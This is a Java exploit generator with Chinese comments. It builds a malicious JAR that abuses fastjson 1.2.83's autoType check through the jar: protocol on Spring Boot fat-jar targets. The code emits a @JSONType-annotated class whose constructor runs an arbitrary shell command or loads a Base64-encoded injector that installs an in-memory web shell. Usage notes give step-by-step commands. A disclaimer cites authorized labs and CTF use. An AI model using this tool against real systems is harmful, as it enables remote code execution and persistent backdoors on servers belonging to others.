import org.objectweb.asm.AnnotationVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * GenJar —— 生成 fastjson 1.2.83 `jar:` 协议利用所需的“恶意类 jar”。
 *
 * 原理简述：
 *   fastjson 的 ParserConfig.checkAutoType() 在真正校验类名之前，会先做一次
 *   @JSONType 注解探测：
 *
 *       String resource = typeName.replace('.', '/') + ".class";
 *       is = defaultClassLoader.getResourceAsStream(resource);
 *
 *   当 @type 形如 jar:file:.tmp.uploads.fj31!.Exception 时，resource 就是
 *   jar:file:/tmp/uploads/fj31!/Exception.class —— 一个合法的 JAR URL。
 *   在 Spring Boot fat jar（LaunchedURLClassLoader）下，URLClassPath 会退化成
 *   通用 Loader，直接 new URL(base, name).openStream()，于是真的去打开上传的
 *   文件、按 zip 读出 Exception.class。
 *
 *   类上带 @JSONType 时 jsonType=true，进入信任分支并直接 return（在 ClassLoader
 *   黑名单检查之前），随后 TypeUtils.loadClass 用同一个加载器把类 define 出来，
 *   fastjson 反射 newInstance()，触发 <clinit>/构造器。
 *
 * 三处名字必须对齐：
 *   @type       jar:file:.tmp.uploads.fj31!.Exception     （点形态）
 *   resource    jar:file:/tmp/uploads/fj31!/Exception.class
 *   this_class  jar:file:/tmp/uploads/fj31!/Exception     （ASM 内部类名）
 *   zip entry   Exception.class                           （不能带前导 /）
 *
 * 用法：
 *   # 1) 命令探针模式（验证链路）
 *   javac -cp asm-9.6.jar GenJar.java
 *   java -cp asm-9.6.jar:. GenJar /tmp/uploads/fj31 --cmd 'id > /tmp/pwned'
 *
 *   # 2) 内嵌 Installer 内存马模式（对应 WP 的实现）
 *   java -cp asm-9.6.jar:. GenJar /tmp/uploads/fj31 --installer Installer.class --shell-path /mshell
 *
 *   # 2b) 直接喂 MemShellParty 的 Base64 输出（打包分类 Base64 / DefaultBase64）
 *   java -cp asm-9.6.jar:. GenJar /tmp/uploads/fj31 --installer-b64 injector.b64
 *
 *   # 其他参数
 *   --out <file>     输出文件名（默认取 targetPath 的最后一段）
 *   --win            用 cmd.exe /c 代替 /bin/sh -c（仅 --cmd 模式）
 *   --version <n>    class 文件版本，默认 52（Java 8）；可改 50（Java 6）
 *
 * 约束（违反任意一条链路就断）：
 *   - targetPath 必须是目标上的绝对路径，且整体不能含 '.'（点会被 replace 成 '/'）
 *   - @type 总长度必须 < 192（checkAutoType 的长度检查）
 *   - zip 条目名必须是 Exception.class，不能是 /Exception.class
 *   - 目标必须是 JDK 8 + Spring Boot fat jar（LaunchedURLClassLoader）
 *   - Installer.class 编译目标必须是 Java 8，且 Base64 后 < 65535 字节
 *
 * 免责声明：仅用于授权靶场 / CTF / 安全研究。
 */
public class GenJar {

    private static final String JSONTYPE_DESC = "Lcom/alibaba/fastjson/annotation/JSONType;";
    private static final String ENTRY_NAME = "Exception.class";
    private static final int MAX_AT_TYPE_LEN = 191;   // typeName.length() >= 192 会被 fastjson 拒绝

    public static void main(String[] args) throws Exception {
        if (args.length == 0 || args[0].equals("-h") || args[0].equals("--help")) {
            usage();
            return;
        }

        String targetPath = args[0];
        String out = null;
        String cmd = null;
        String installerPath = null;
        String installerB64Path = null;
        String shellPath = null;
        boolean win = false;
        int version = Opcodes.V1_8;

        for (int i = 1; i < args.length; i++) {
            switch (args[i]) {
                case "--cmd":           cmd = need(args, ++i, "--cmd"); break;
                case "--installer":     installerPath = need(args, ++i, "--installer"); break;
                case "--installer-b64": installerB64Path = need(args, ++i, "--installer-b64"); break;
                case "--shell-path":    shellPath = need(args, ++i, "--shell-path"); break;
                case "--out":           out = need(args, ++i, "--out"); break;
                case "--version":       version = Integer.parseInt(need(args, ++i, "--version")); break;
                case "--win":           win = true; break;
                default:
                    throw new IllegalArgumentException("unknown option: " + args[i]);
            }
        }

        int modes = (cmd != null ? 1 : 0) + (installerPath != null ? 1 : 0) + (installerB64Path != null ? 1 : 0);
        if (modes != 1) {
            throw new IllegalArgumentException("必须且只能指定 --cmd / --installer / --installer-b64 之一");
        }

        if (cmd == null) {
            if (shellPath == null) {
                shellPath = "/mshell";
            }
            if (!shellPath.startsWith("/")) {
                throw new IllegalArgumentException("--shell-path 必须以 '/' 开头，例如 /mshell");
            }
        } else if (shellPath != null) {
            throw new IllegalArgumentException("--shell-path 只用于 --installer / --installer-b64 模式");
        }

        // ---------- 校验 ----------
        if (!targetPath.startsWith("/")) {
            throw new IllegalArgumentException("targetPath 必须是目标上的绝对路径，如 /tmp/uploads/fj31");
        }
        if (targetPath.contains(".")) {
            throw new IllegalArgumentException("targetPath 不能含 '.'（fastjson 会把每个点都替换成 '/'）：" + targetPath);
        }
        if (targetPath.contains("!")) {
            throw new IllegalArgumentException("targetPath 不能含 '!'");
        }
        if (targetPath.endsWith("/")) {
            throw new IllegalArgumentException("targetPath 不能以 '/' 结尾");
        }
        if (version != Opcodes.V1_8 && version != Opcodes.V1_6 && version != Opcodes.V1_7) {
            throw new IllegalArgumentException("--version 只支持 50/51/52");
        }

        String internalName = "jar:file:" + targetPath + "!/Exception";
        String atType = internalName.replace('/', '.');
        if (atType.length() > MAX_AT_TYPE_LEN) {
            throw new IllegalArgumentException("@type 长度 " + atType.length()
                    + " 超过 fastjson 的 192 上限，请缩短落盘路径");
        }

        String targetName = targetPath.substring(targetPath.lastIndexOf('/') + 1);
        if (out == null) {
            out = targetName;
        }
        Path outPath = Paths.get(out).toAbsolutePath();
        String outName = outPath.getFileName().toString();
        if (outName.contains(".")) {
            throw new IllegalArgumentException("输出文件名不能含 '.'（上传到目标后就是 targetPath 的文件名）");
        }
        if (!outName.equals(targetName)) {
            throw new IllegalArgumentException("输出文件名 " + outName
                    + " 必须与 targetPath 的文件名 " + targetName + " 一致（上传后按文件名落盘）");
        }

        // ---------- 生成字节码 ----------
        byte[] installerBytes = null;
        String installerB64 = null;
        if (installerPath != null) {
            installerBytes = Files.readAllBytes(Paths.get(installerPath));
            installerB64 = Base64.getEncoder().encodeToString(installerBytes);
        } else if (installerB64Path != null) {
            String raw = new String(Files.readAllBytes(Paths.get(installerB64Path)), StandardCharsets.US_ASCII);
            String clean = raw.replaceAll("\\s+", "");
            try {
                installerBytes = Base64.getDecoder().decode(clean);
            } catch (IllegalArgumentException e) {
                throw new IllegalArgumentException("--installer-b64 不是合法 Base64：" + e.getMessage());
            }
            if (installerBytes.length < 4
                    || (installerBytes[0] & 0xff) != 0xCA || (installerBytes[1] & 0xff) != 0xFE
                    || (installerBytes[2] & 0xff) != 0xBA || (installerBytes[3] & 0xff) != 0xBE) {
                throw new IllegalArgumentException("解码结果不是 Java class（缺少 CAFEBABE），请确认复制完整");
            }
            installerB64 = clean;
        }

        if (installerB64 != null && installerB64.length() > 65535) {
            throw new IllegalArgumentException("Installer Base64 长度 " + installerB64.length()
                    + " 超过常量池 UTF-8 上限 65535，请换更小的 shell 或精简注入器");
        }

        byte[] classBytes = buildClass(internalName, version, cmd, win, installerB64);

        // ---------- 打包 ----------
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(outPath.toFile()))) {
            ZipEntry entry = new ZipEntry(ENTRY_NAME);   // 注意：不带前导 '/'
            zos.putNextEntry(entry);
            zos.write(classBytes);
            zos.closeEntry();
        }

        // ---------- 输出提示 ----------
        System.out.println("[+] target path : " + targetPath);
        System.out.println("[+] internal    : " + internalName);
        System.out.println("[+] @type       : " + atType);
        System.out.println("[+] zip entry   : " + ENTRY_NAME);
        System.out.println("[+] class bytes : " + classBytes.length);
        System.out.println("[+] payload     : " + (cmd != null ? "cmd: " + cmd : "installer: " + installerBytes.length + " bytes"));
        System.out.println("[+] output      : " + outPath);
        System.out.println();
    }

    // ------------------------------------------------------------------ //

    private static byte[] buildClass(String internalName, int version,
                                     String cmd, boolean win, String installerB64) {
        ClassWriter cw = new ClassWriter(0);

        // public class <jar:file:...!/Exception> extends java.lang.ClassLoader
        cw.visit(version, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER,
                internalName, null, "java/lang/ClassLoader", null);

        // @JSONType(asm = false)
        AnnotationVisitor av = cw.visitAnnotation(JSONTYPE_DESC, true);
        av.visit("asm", Boolean.FALSE);
        av.visitEnd();

        // <init>()V : super(TCCL); this.run();
        MethodVisitor init = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        init.visitCode();
        init.visitVarInsn(Opcodes.ALOAD, 0);
        init.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Thread", "currentThread",
                "()Ljava/lang/Thread;", false);
        init.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Thread", "getContextClassLoader",
                "()Ljava/lang/ClassLoader;", false);
        init.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/ClassLoader", "<init>",
                "(Ljava/lang/ClassLoader;)V", false);
        init.visitVarInsn(Opcodes.ALOAD, 0);
        init.visitMethodInsn(Opcodes.INVOKESPECIAL, internalName, "run", "()V", false);
        init.visitInsn(Opcodes.RETURN);
        init.visitMaxs(2, 1);
        init.visitEnd();

        // private void run() : payload
        MethodVisitor run = cw.visitMethod(Opcodes.ACC_PRIVATE, "run", "()V", null, null);
        run.visitCode();
        if (cmd != null) {
            emitExec(run, cmd, win);
        } else {
            emitInstaller(run, installerB64);
        }
        run.visitInsn(Opcodes.RETURN);
        run.visitMaxs(cmd != null ? 5 : 5, cmd != null ? 1 : 2);
        run.visitEnd();

        cw.visitEnd();
        return cw.toByteArray();
    }

    /** Runtime.getRuntime().exec({shell, flag, cmd}); */
    private static void emitExec(MethodVisitor mv, String cmd, boolean win) {
        String[] parts = win
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"/bin/sh", "-c", cmd};

        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime",
                "()Ljava/lang/Runtime;", false);
        mv.visitIntInsn(Opcodes.BIPUSH, parts.length);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
        for (int i = 0; i < parts.length; i++) {
            mv.visitInsn(Opcodes.DUP);
            mv.visitIntInsn(Opcodes.BIPUSH, i);
            mv.visitLdcInsn(parts[i]);
            mv.visitInsn(Opcodes.AASTORE);
        }
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                "([Ljava/lang/String;)Ljava/lang/Process;", false);
        mv.visitInsn(Opcodes.POP);
    }

    /**
     * byte[] b = Base64.getDecoder().decode(B64);
     * this.defineClass(null, b, 0, b.length).newInstance();
     */
    private static void emitInstaller(MethodVisitor mv, String b64) {
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/util/Base64", "getDecoder",
                "()Ljava/util/Base64$Decoder;", false);
        mv.visitLdcInsn(b64);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/util/Base64$Decoder", "decode",
                "(Ljava/lang/String;)[B", false);
        mv.visitVarInsn(Opcodes.ASTORE, 1);

        mv.visitVarInsn(Opcodes.ALOAD, 0);
        mv.visitInsn(Opcodes.ACONST_NULL);
        mv.visitVarInsn(Opcodes.ALOAD, 1);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, 1);
        mv.visitInsn(Opcodes.ARRAYLENGTH);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/ClassLoader", "defineClass",
                "(Ljava/lang/String;[BII)Ljava/lang/Class;", false);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "newInstance",
                "()Ljava/lang/Object;", false);
        mv.visitInsn(Opcodes.POP);
    }

    // ------------------------------------------------------------------ //

    private static String need(String[] args, int i, String opt) {
        if (i >= args.length) {
            throw new IllegalArgumentException(opt + " 缺少参数");
        }
        return args[i];
    }

    private static void usage() {
        System.out.println("GenJar —— fastjson 1.2.83 jar: 协议恶意类 jar 生成器");
        System.out.println();
        System.out.println("用法:");
        System.out.println("  java -cp asm-9.6.jar:. GenJar <targetPath> --cmd '<cmd>' [--win] [--out <file>]");
        System.out.println("  java -cp asm-9.6.jar:. GenJar <targetPath> --installer <Installer.class> [--shell-path /mshell] [--out <file>]");
        System.out.println("  java -cp asm-9.6.jar:. GenJar <targetPath> --installer-b64 <base64.txt> [--shell-path /mshell] [--out <file>]");
        System.out.println();
        System.out.println("示例:");
        System.out.println("  java -cp asm-9.6.jar:. GenJar /tmp/uploads/fj31 --cmd 'id > /tmp/pwned'");
        System.out.println("  java -cp asm-9.6.jar:. GenJar /tmp/uploads/fj31 --installer Installer.class");
        System.out.println("  # MemShellParty 打包分类选 Base64 / DefaultBase64，保存后用：");
        System.out.println("  java -cp asm-9.6.jar:. GenJar /tmp/uploads/fj31 --installer-b64 injector.b64");
        System.out.println();
        System.out.println("说明: targetPath 必须是目标上的绝对路径且不含 '.'，文件本身也不能带扩展名。");
    }
}
